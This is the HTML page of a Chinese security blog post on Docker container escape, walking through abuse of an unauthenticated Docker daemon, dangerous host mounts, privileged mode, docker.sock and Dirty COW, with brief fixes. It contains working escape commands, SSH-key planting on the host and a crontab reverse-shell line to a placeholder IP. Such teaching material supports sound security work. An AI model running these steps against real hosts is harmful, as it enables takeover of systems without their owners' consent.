@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="SeikoSrp">
+
+
+
+
+
+
+<title>容器安全之docker逃逸 | a blog</title>
+
+
+
+    <link rel="icon" href="/haidao.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+    <script src="/js/jquery.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+
+
+    <script>
+    function searchToggle() {
+        const width = $(document.body).width()
+        if(width > 479) {
+            return;
+        }
+        const search = $('.search');
+        const searchForm = $('.form-search');
+        const menuToggle = $('.menu-toggle');
+        const title = $('.navbar-header-title');
+
+        if(!search.hasClass("mobile-search")) {
+            search.addClass("mobile-search");
+            menuToggle.addClass("open-search")
+            title.addClass("mobile-title-hidden")
+        } else {
+            search.removeClass("mobile-search");
+            menuToggle.removeClass("open-search")
+            // title.css({visibility: 'visible'})
+            title.removeClass("mobile-title-hidden")
+        } 
+    }
+
+    function search(searchInputEl, formEl, flag) {
+        const path = "/" + "search.json"; // 可以在public 下查看这个search.json
+        $(formEl).submit(function(e){
+            e.preventDefault();
+            let target = null
+            if(searchInputEl == null) {
+                const screenWidth = $(document.body).width();
+                target = screenWidth > 479 ? $('#pc-search-input') : $('#mobile-search-input');
+                console.log(target);
+            } else {
+                target = $(searchInputEl)
+            }
+
+            if(!flag && target.val() === '') {
+                return ;
+            }
+
+            $("#u-search").fadeIn(500, function() {
+                $("body > .wrapper").addClass("modal-active");
+
+                $.ajax({
+                    url: path,
+                    dataType: "json",
+                    beforeSend: function (xhr) {
+                        $input = target.val();
+                        $(".form-input").val($input);
+                        const loadingBar = $('.search-loading-bar') 
+                        loadingBar.css({
+                            width:'100%',
+                            display: 'block'
+                        });
+                    },
+                    success: function( datas ) {
+                        // console.log(datas);
+                        const $resultPanel = $(".modal-body")[0];
+                        let str = `<ul class="modal-results">`;
+                        var keywords = $(".form-input").val().trim().toLowerCase().split(/[\s\-]+/);
+                        $resultPanel.innerHTML = "";
+                        let hasResult = false
+                        let text = `<div class="no-result">找不到与关键词相关的内容....</div>`;
+
+                        if ($(".form-input").val().trim().length <= 0) {
+                            // 没有结果
+                            $resultPanel.innerHTML = text;
+                            return;
+                        }
+                        datas.forEach(function (data) {
+                            var isMatch = true;
+                            if (!data.title || data.title.trim() === '') {
+                                data.title = "Untitled";
+                            }
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty contents
+                            if (data_content !== '') {
+                                keywords.forEach(function (keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        hasResult = true
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            } else {
+                                isMatch = false;
+                            }
+                            // show search results
+                            if (isMatch) {
+                                str += `<li class='result-item'><a href='${data_url}' class='result-item-detail'> <span class="title">${data_title}</span>`;
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 200 characters
+                                    var start = first_occur - 40;
+                                    var end = first_occur + 160;
+
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+
+                                    if (start == 0) {
+                                        end = 200;
+                                    }
+
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+
+                                    var match_content = content.substring(start, end);
+
+                                    // highlight all keywords
+                                    keywords.forEach(function (keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, `<em class="search-keyword">${keyword}</em>`);
+                                    });
+
+                                    str += `<span class="content"> ${match_content} ...</span></a>`;
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        if(hasResult) {
+                            $resultPanel.innerHTML = str;
+                        } else {
+                            $resultPanel.innerHTML = text;
+                        }
+
+                    },
+                    complete: function() {
+                        setTimeout(() => {
+                                const loadingBar = $('.search-loading-bar') 
+                                loadingBar.css({
+                                    width:'0%',
+                                    display: 'none'
+                                });
+                        }, 300)
+                    }
+                });
+            })
+
+        });
+    }
+
+    $(document).ready(function() {
+        $('.modal-close').click(function () { 
+            $("#u-search").fadeOut();
+            $("body > .wrapper").removeClass("modal-active")
+        })
+
+        $('.modal-overlay').click(function() {
+            $("#u-search").fadeOut();
+            $("body > .wrapper").removeClass("modal-active")
+        })
+        search(null, ".form-search", false)
+        search("#u-search-modal-form .form-input", ".u-search-modal-form", true)
+    })
+</script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+<!-- Chic/layout.ejs -->
+ <div id="u-search">
+        <div class="modal">
+            <div class="modal-header">
+                <div class="container">
+                    <form id="u-search-modal-form" class="u-search-modal-form">
+                        <button type="submit" class="form-submit-btn">
+                            <img src="/image/search.png" class="search-btn-img" />
+                        </button>
+                        <input placeholder="搜索文章。。。" class="form-input" id="modal-form-input">
+                    </form>
+                    <a class="modal-close">x</a>
+                </div>
+                <div class="search-loading">
+                    <div class="search-loading-bar"></div>
+                </div>
+            </div>
+            <div class="modal-body">
+                <!-- ul 格式如下 -->
+                <!-- <ul class="modal-results">
+                    <li class="result-item">
+                        <a class="result-item-detail">
+                            <span class="title">页面配置</span>
+                            <span class="content">
+                                content
+                            </span>
+                        </a>
+                    </li>
+                </ul> -->
+            </div>
+        </div>
+        <div class="modal-overlay"></div>
+    </div>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">SeikoSrp&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                <!-- 这里表示的是pc端搜索框 -->
+                
+                
+    <div class="search ">
+        <div class="search-btn" onClick="searchToggle()">
+            <img src="/image/search.png" class="search-btn-img" />
+        </div>
+        <form class="form-search">
+            <input class="input" placeholder="搜索文章" autocomplete="off" id="pc-search-input"/>
+        </form>
+    </div>
+
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/about">关于</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">SeikoSrp&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="navbar-mobile-right">
+                    
+                    
+    <div class="search ">
+        <div class="search-btn" onClick="searchToggle()">
+            <img src="/image/search.png" class="search-btn-img" />
+        </div>
+        <form class="form-search">
+            <input class="input" placeholder="搜索文章" autocomplete="off" id="mobile-search-input"/>
+        </form>
+    </div>
+
+                    <div class="menu-toggle" onclick="mobileBtn()">&#9776; 目录</div>
+                </div>
+                
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/about">关于</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">全部展开</a>
+        <a onclick="go_top()">回到顶部</a>
+        <a onclick="go_bottom()">前往底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "全部折叠"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "全部展开"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">容器安全之docker逃逸</h1>
+            
+                <div class="post-meta">
+                    
+                        作者: <a itemprop="author" rel="author" href="/">SeikoSrp</a>
+                    
+
+                    
+                        <span class="post-time">
+                        发布于: <a href="#">十二月 18, 2020&nbsp;&nbsp;18:47:41</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    分类:
+                            
+                                <a href="/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE-%E4%BA%91-%E5%AE%B9%E5%99%A8/">大数据/云/容器</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>最近在做docker和K8S的安全测试，并且近期希望多些点博客，所以在此记录一下，另外这里文中提到的都是几种配置层面的docker的安全问题。</p>
+<h1 id="0x00-Hypervisor"><a href="#0x00-Hypervisor" class="headerlink" title="0x00 Hypervisor"></a>0x00 Hypervisor</h1><p>Hypervisor，又称虚拟机监视器（英语：virtual machine monitor，缩写为 VMM），是用来建立与执行虚拟机器的软件、固件或硬件。</p>
+<p>Hypervisor用来执行一个或多个虚拟机器的电脑称为主体机器（host machine），这些虚拟机器则称为客体机器（guest machine）。hypervisor提供虚拟的作业平台来执行客体操作系统（guest operating systems），负责管理其他客体操作系统的执行阶段；这些客体操作系统，共同分享虚拟化后的硬件资源。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hypervisor——一种运行在基础物理服务器和操作系统之间的中间软件层，可允许多个操作系统和应用共享硬件。也可叫做VMM（ virtual machine monitor ），即虚拟机监视器。</span><br><span class="line">Hypervisors是一种在虚拟环境中的“元”操作系统。他们可以访问服务器上包括磁盘和内存在内的所有物理设备。Hypervisors不但协调着这些硬件资源的访问，也同时在各个虚拟机之间施加防护。当服务器启动并执行Hypervisor时，它会加载所有虚拟机客户端的操作系统同时会分配给每一台虚拟机适量的内存，CPU，网络和磁盘。</span><br></pre></td></tr></table></figure>
+
+<h2 id="常见的Hypervisor架构"><a href="#常见的Hypervisor架构" class="headerlink" title="常见的Hypervisor架构"></a>常见的Hypervisor架构</h2><p>三种最常见的Hypervisor架构</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">I型：虚拟机直接运行在系统硬件上，创建硬件全仿真实例，被称为&quot;裸机&quot;。</span><br><span class="line">II型：虚拟机运行在传统操作系统上，同样创建的是硬件全仿真实例，被称为&quot;托管&quot;hypervisor。</span><br><span class="line">容器：虚拟机运行在传统操作系统上，创建一个独立的虚拟化实例，指向底层托管操作系统，被称为&quot;操作系统虚拟化&quot;。</span><br></pre></td></tr></table></figure>
+
+<p>引用网上的两个图：</p>
+<p><img src="%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E4%B9%8Bdocker%E9%80%83%E9%80%B8.assets/image-20201105101116146.png" alt="image-20201105101116146"></p>
+<p><img src="%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E4%B9%8Bdocker%E9%80%83%E9%80%B8.assets/image-20201105101222345.png" alt="image-20201105101222345"></p>
+<p>可以看到Type-I型的VVM是直接运行在硬件上的，也就是Ring0层，例子：VMware ESX Server、Citrix XenServer 和 Microsoft Hyper-V，Linux KVM。</p>
+<p>Type-II型的在VMM和硬件之间还有一层宿主操作系统。由于 Guest OS 对硬件的访问必须 经过宿主操作系统，因而带来了额外的性能开销，但可充分利用宿主操作系统 提供的设备驱动和底层服务来进行内存管理、进程调度和资源管理等。主机虚 拟化中 VM 的应用程序调用硬件资源时需要经过:VM 内核-&gt;Hypervisor-&gt;主机内核 ，导致性能是三种虚拟化技术中最差的 。<br>例子：VMware Server（GSX）、Workstation 和 Microsoft Virtual PC 、 Virtual Server 等。</p>
+<h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><p>第三种是容器，docker也就是容器的一种。前面两种都可以成为是虚拟机，与虚拟机相比，容器资源的损耗小的多，同样的宿主机下，能够建立容器的数量要比虚拟机多得多。但是容器的安全性不如虚拟机，因为虚拟机需要突破hypervisor。docker容器与宿主机共享内核，文件系统等资源，更有可能对其他容器，宿主机产生影响。</p>
+<h1 id="0x01-容器安全面临的主要风险"><a href="#0x01-容器安全面临的主要风险" class="headerlink" title="0x01 容器安全面临的主要风险"></a>0x01 容器安全面临的主要风险</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1、虚拟化安全风险</span><br><span class="line">直白的说就是容器的隔离和逃逸问题</span><br><span class="line"></span><br><span class="line">2、镜像安全风险</span><br><span class="line">比如下载了恶意的镜像，或者镜像源被污染</span><br><span class="line"></span><br><span class="line">3、网络安全风险</span><br><span class="line">也就是网络层面的攻击，比如在2019年的KCON上还有关于针对Docker容器网络的ARP欺骗攻击的议题</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x03-常见的逃逸手法"><a href="#0x03-常见的逃逸手法" class="headerlink" title="0x03 常见的逃逸手法"></a>0x03 常见的逃逸手法</h1><h2 id="Docker-daemon未授权访问"><a href="#Docker-daemon未授权访问" class="headerlink" title="Docker daemon未授权访问"></a>Docker daemon未授权访问</h2><p>直接在shadon上搜到了一个：<a href="https://www.shodan.io/host/XXXXXX" target="_blank" rel="noopener">https://www.shodan.io/host/XXXXXX</a></p>
+<p><img src="%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E4%B9%8Bdocker%E9%80%83%E9%80%B8.assets/image-20201106151758047.png" alt="image-20201106151758047"></p>
+<p>查看镜像：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://xx.xx.xx.xx:2375 images</span><br></pre></td></tr></table></figure>
+
+<p><img src="%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E4%B9%8Bdocker%E9%80%83%E9%80%B8.assets/image-20201106151903900.png" alt="image-20201106151903900"></p>
+<h3 id="写入公钥"><a href="#写入公钥" class="headerlink" title="写入公钥"></a>写入公钥</h3><p>首先启动一个容器，并且将宿主机的关键目录挂载到docker中：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://xx.xx.xx.xx run -it -v /root:/tmp/root -v /etc/ssh:/tmp/ssh_etc -v /var/<span class="built_in">log</span>:/tmp/<span class="built_in">log</span> e83c2c53328c /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E4%B9%8Bdocker%E9%80%83%E9%80%B8.assets/image-20201112150816445.png" alt="image-20201112150816445"></p>
+<p>查看是否允许root登录，Yes为允许：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;tmp&#x2F;ssh_etc&#x2F;sshd_config |grep PermitRootLogin</span><br></pre></td></tr></table></figure>
+
+<p><img src="%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E4%B9%8Bdocker%E9%80%83%E9%80%B8.assets/image-20201112151210656.png" alt="image-20201112151210656"></p>
+<p>然后在自己的攻击者电脑上生成密钥对：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;hello@world.com&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E4%B9%8Bdocker%E9%80%83%E9%80%B8.assets/image-20201112151628786.png" alt="image-20201112151628786"></p>
+<p>将公钥写入到宿主机的<code>/root/.ssh/authorized_keys</code>文件中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &gt;&gt; &#x2F;tmp&#x2F;root&#x2F;.ssh&#x2F;authorized_keys &lt;&lt;EOF</span><br></pre></td></tr></table></figure>
+
+<p><img src="%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E4%B9%8Bdocker%E9%80%83%E9%80%B8.assets/image-20201112151749738.png" alt="image-20201112151749738"></p>
+<p>在<code>&gt;</code>符号之后输入公钥，然后再输入<code>EOF</code>即可，然后就可以使用私钥ssh登录目标宿主机：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i .&#x2F;id_rsa root@xx.xx.xx.xx -p 1022</span><br></pre></td></tr></table></figure>
+
+<p>修复方案</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.对2375端口做网络访问控制，如ACL控制，或者访问规则</span><br><span class="line"></span><br><span class="line">2.修改docker swarm的认证方式，使用TLS认证：Overview Swarm with TLS 和 Configure Docker Swarm for TLS这两篇文档，说的是配置好TLS后，Docker CLI 在发送命令到docker daemon之前，会首先发送它的证书，如果证书是由daemon信任的CA所签名的，才可以继续执行。</span><br></pre></td></tr></table></figure>
+
+<h2 id="挂载目录方式逃逸"><a href="#挂载目录方式逃逸" class="headerlink" title="挂载目录方式逃逸"></a>挂载目录方式逃逸</h2><p>在linux下，/mnt/目录的作用为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">挂接光驱、USB设备的目录，加载后，会在mnt里多出相应设备的目录。mnt是mount的缩写。</span><br></pre></td></tr></table></figure>
+
+<p>关于/mnt/的几个点：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、挂载点必须是一个目录。</span><br><span class="line"></span><br><span class="line">2、一个分区挂载在一个已存在的目录上，这个目录可以不为空，但挂载后这个目录下以前的内容将不可用。对于其他操作系统建立的文件系统的挂载也是这样。</span><br><span class="line"></span><br><span class="line">3、光盘、软盘、其他操作系统使用的文件系统的格式与linux使用的文件系统格式是不一样的。光盘是ISO9660；软盘是fat16或ext2；windows NT是fat16、NTFS；windows98是fat16、fat32；windows2000和windowsXP是fat16、fat32、 NTFS。挂载前要了解linux是否支持所要挂载的文件系统格式。</span><br></pre></td></tr></table></figure>
+
+<p><strong>docker的危险挂载方式：</strong></p>
+<p>例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run --name wnginx -d -v &#x2F;root:&#x2F;mnt&#x2F;root</span><br><span class="line"></span><br><span class="line">docker run -it -v &#x2F;root:&#x2F;mnt&#x2F;root e83c2c53328c &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E4%B9%8Bdocker%E9%80%83%E9%80%B8.assets/image-20201106164818877.png" alt="image-20201106164818877"></p>
+<p>这里是挂载了宿主机的/root/目录，就可以直接写入ssh秘钥了，还有其他的方式比如挂载了/var/目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、在~&#x2F;.ssh目录中留SSH公钥 </span><br><span class="line">cat id_rsa.pub &gt;&gt; &#x2F;mnt&#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">2、Crontab 中留定时任务, 定时反弹shell至指定服务器</span><br><span class="line">echo &#39;* * * * * &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xx.xx.xx.xx&#x2F;8888 0&gt;&amp;1&#39; &gt;&gt; &#x2F;mnt&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root</span><br></pre></td></tr></table></figure>
+
+<h2 id="特权模式运行利用"><a href="#特权模式运行利用" class="headerlink" title="特权模式运行利用"></a>特权模式运行利用</h2><p>docker特权模式下运行的容器可以在容器内执行mount等命令，从而能够将宿主机的目录挂载到容器内。</p>
+<p>首先使用特权模式启用容器：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --privileged e83c2c53328c &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E4%B9%8Bdocker%E9%80%83%E9%80%B8.assets/image-20201106173134735.png" alt="image-20201106173134735"></p>
+<p>然后使用mount命令将宿主机的目录挂载到容器内的abc目录下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount &#x2F;dev&#x2F;vda1 &#x2F;abc</span><br></pre></td></tr></table></figure>
+
+<p><img src="%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E4%B9%8Bdocker%E9%80%83%E9%80%B8.assets/image-20201106174202014.png" alt="image-20201106174202014"></p>
+<p>挂载成功之后<code>ls /abc</code>可以看到已经有内容了，不过这里宿主机的<code>/dev/vda1</code>是<code>/boot/</code>目录，如果是<code>/root/</code>目录就可以进行其他方式的利用</p>
+<h2 id="docker-sock"><a href="#docker-sock" class="headerlink" title="docker.sock"></a>docker.sock</h2><p><a href="https://www.freebuf.com/articles/container/242763.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/container/242763.html</a></p>
+<p>Docker采用C/S架构，我们平常使用的Docker命令中，docker即为client，Server端的角色由docker daemon扮演，二者之间通信方式有以下3种：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock</span><br><span class="line">2、tcp:&#x2F;&#x2F;host:port</span><br><span class="line">3、fd:&#x2F;&#x2F;socketfd</span><br></pre></td></tr></table></figure>
+
+<p>当容器进程需要与docker daemon守护进程进行通信的时候，容器本身需要挂载<code>/var/run/docker.sock</code>文件，这里首先在Kali中创建起一个ubuntu，并且挂载了<code>/var/run/</code>目录</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v /var/run/:/host/var/run/ ubuntu /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E4%B9%8Bdocker%E9%80%83%E9%80%B8.assets/image-20201109141429664.png" alt="image-20201109141429664"></p>
+<p>然后在容器内安装docker</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install docker.io</span><br><span class="line">备注：这里容器进入之后没有办法直接安装，需要更新：apt-get update</span><br></pre></td></tr></table></figure>
+
+<p><img src="%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E4%B9%8Bdocker%E9%80%83%E9%80%B8.assets/image-20201109135600326.png" alt="image-20201109135600326"></p>
+<p><img src="%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E4%B9%8Bdocker%E9%80%83%E9%80%B8.assets/image-20201109135623897.png" alt="image-20201109135623897"></p>
+<p>查看宿主机docker信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H unix:&#x2F;&#x2F;&#x2F;host&#x2F;var&#x2F;run&#x2F;docker.sock info</span><br></pre></td></tr></table></figure>
+
+<p><img src="%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E4%B9%8Bdocker%E9%80%83%E9%80%B8.assets/image-20201109141508580.png" alt="image-20201109141508580"></p>
+<p>运行一个挂载宿主机根目录的新容器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H unix:&#x2F;&#x2F;&#x2F;host&#x2F;var&#x2F;run&#x2F;docker.sock run -v &#x2F;:&#x2F;aa -it ubuntu &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E4%B9%8Bdocker%E9%80%83%E9%80%B8.assets/image-20201109141641961.png" alt="image-20201109141641961"></p>
+<p>查看挂载了宿主机根目录的aa文件夹</p>
+<p><img src="%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E4%B9%8Bdocker%E9%80%83%E9%80%B8.assets/image-20201109141849431.png" alt="image-20201109141849431"></p>
+<p>发现已经可以宿主机kali的根目录了，然后可以通过写计划任务，或者是写ssh秘钥进行连接</p>
+<h2 id="脏牛漏洞"><a href="#脏牛漏洞" class="headerlink" title="脏牛漏洞"></a>脏牛漏洞</h2><p>因为容器和宿主机共用内核，所以当宿主机存在脏牛漏洞时可以在容器内部完成逃逸。</p>
+<h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><p>Linux内核&gt;=2.6.22</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@33ef38054e34:/# git clone https://github.com/gebl/dirtycow-docker-vdso.git</span><br><span class="line">root@33ef38054e34:/# cd dirtycow-docker-vdso/</span><br><span class="line">root@33ef38054e34:/# make</span><br><span class="line">root@33ef38054e34:/# ./0xdeadbeef xx.xx.xx.xx:1234</span><br></pre></td></tr></table></figure>
+
+<p><img src="%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E4%B9%8Bdocker%E9%80%83%E9%80%B8.assets/image-20201111202611035.png" alt="image-20201111202611035"></p>
+<h2 id="RunC漏洞-CVE-2019-5736"><a href="#RunC漏洞-CVE-2019-5736" class="headerlink" title="RunC漏洞(CVE-2019-5736)"></a>RunC漏洞(CVE-2019-5736)</h2><p>没找到对应版本的RUNC，可以参考：<a href="https://cloud.tencent.com/developer/article/1512483" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1512483</a></p>
+<h1 id="0x04-容器安全防护"><a href="#0x04-容器安全防护" class="headerlink" title="0x04 容器安全防护"></a>0x04 容器安全防护</h1><p>安全的问题到最后都是人的问题，容器安全更是一样，在企业内网中除了正式运营的项目的容器配置问题之外，还有可能存在个人部署的docker所以除了严格准守安全基线运行docker之外还需要实时的排查扫描，并且可以尝试利用docker的日志进行高危容器检测。</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.freebuf.com/articles/system/221319.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/221319.html</a><br><a href="https://www.cnblogs.com/operationhome/p/10907591.html" target="_blank" rel="noopener">https://www.cnblogs.com/operationhome/p/10907591.html</a></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/12-18-%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E4%B9%8BK8S_APIServer%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">容器安全之K8S_APIServer未授权访问</a>
+            
+            
